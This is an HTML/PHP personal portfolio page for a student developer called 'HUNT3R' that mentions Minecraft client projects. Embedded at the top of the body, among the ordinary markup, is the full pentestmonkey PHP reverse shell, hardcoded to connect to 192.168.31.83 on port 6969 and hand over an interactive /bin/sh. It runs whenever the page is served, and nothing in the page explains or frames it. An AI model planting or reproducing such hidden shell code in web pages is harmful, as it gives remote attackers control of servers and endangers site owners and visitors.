<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Google Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
      rel="stylesheet"
    />

    <!-- AOS -->
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />

    <link rel="stylesheet" href="style.css" />
    <title>About Me</title>
  </head>
  <body>
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.31.83';  // CHANGE THIS
$port = 6969;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
    <header data-aos="fade-down" data-aos-delay="200">
      <div class="container">
        <div class="content">
          <div class="logo">
            <a href="">HUNT3R.</a>
          </div>

          <nav>
            <a href="#about">About</a>
            <a href="#projects">Projects</a>
            <a href="#contact">Contact</a>
          </nav>

          <div class="extra-nav">
            <!-- <a href="#"><span>AVAILABLE FOR WORK</span></a>
          </div> 
        </div> -->
      </div>
    </header>

    <section class="hero">
      <div class="container">
        <div class="content">
          <div class="shape-1"></div>
          <div class="shape-2"></div>
          <div class="line"></div>

          <div class="text">
            <h1 class="row-1" data-aos="fade-right"
            data-aos-duration="2000">WEB APP</h1>
            <h1 class="row-2" data-aos="flip-down" data-aos-duration="2000">DEVELOPMENT</h1>
            <h1
              class="row-3"
              data-aos="fade-left"
              data-aos-duration="2000"
            >
              ENTHUSIAST
            </h1>
          </div>

          <box-icon name="chevron-down" class="arrow"></box-icon>

          <div class="short-info">
            <div
              class="left-side"
              data-aos="fade-up-right"
              data-aos-delay="300"
            >
              <h1>Based in Canada</h1>
              <p class="time"></p>
            </div>

            <div
              class="right-side"
              data-aos="fade-up-left"
              data-aos-delay="300"
            >
              <p>Freelance Availibility</p>
              <h1>
                <div class="pulse"></div>
                VERY LIMITED HOURS
              </h1>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- About Section -->
    <section class="about" id="about">
        <div class="container">
            <div class="content">
                <div class="title">
                    <h2 data-aos="fade-right" data-aos-duration="500" data-aos-delay="300">About</h1>
                    <h1 data-aos="fade-right" data-aos-duration="500" data-aos-delay="500">HUNT3R</h2>
                </div>
                
                <div class="profile-container" data-aos="fade-down" data-aos-duration="1000" data-aos-delay="300">
                  <div class="profile">
                    <img src="assets/profile.png" alt="profile">
                  </div>
                </div>
                
                <div class="about-me" data-aos="fade-left" data-aos-duration="1000" data-aos-delay="300">
                  <p>I am a full time student and a developer for HTML CSS JAVASCRIPT and PYTHON and a bit of JAVA.
                    I am currently working on projects for Minecraft called "Insignia" and "Copeium Client"
                   Clients I use are: Boze, Future, Mio, Rusherhack, Prestige, Abyss, Rise, Novoline.wtf, Myau, Reactor, Opal, Tenacity/Rose(discontinued)
                  </p>
                  <button>Learn More <box-icon class="arrow" name='arrow-back'></box-icon></button>
                </div>

              <div class="text-wrapper" data-aos="flip-up">
                <div class="text">
                </div>
              </div>
            </div>
        </div>
    </section>

    <section class="project" id="project">
      <div class="container">
        <div class="content">
          <div class="header">
            <button data-aos="fade-right" data-aos-duration="1000" data-aos-delay="300" onclick="location.href='projects/index.html'">See All Projects <box-icon class="arrow" name='arrow-back'></box-icon></button>

            <div class="title">
              <h1 class="row-1" data-aos="fade-left" data-aos-duration="500" data-aos-delay="300">Recent</h1>
              <H1 class="row-2" data-aos="fade-left" data-aos-duration="500" data-aos-delay="500">PROJECTS</H1>
            </div>
          </div>

          <div class="project-area"  data-aos="fade-up" data-aos-duration="1000" data-aos-delay="300">
            <div class="projects" onclick="location.href='projects/Project'">
              <img src="assets/project-1.png" alt="">
              <div class="desc">
                <h1>Nothing</h1>
                <p>Nothing Yet</p>
              </div>
            </div>
            <div class="projects" onclick="location.href='projects/Project'">
              <img src="assets/project-2.png" alt="">
              <div class="desc">
                <h1>Nothing</h1>
                <p>Nothing Yet</p>
            </div>
            </div>
            <div class="projects" onclick="location.href='projects/Project'">
              <img src="assets/project-3.png" alt="">
              <div class="desc">
                <h1>Nothing</h1>
                <p>Nothing Yet</p>
            </div>
            </div>
          </div>
        </div>
      </div>
    </section>



    <script src="script.js"></script>

    <!-- Box Icon -->
    <script src="https://unpkg.com/boxicons@2.1.4/dist/boxicons.js"></script>

    <!-- AOS -->
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
      AOS.init();
    </script>
  </body>
</html>
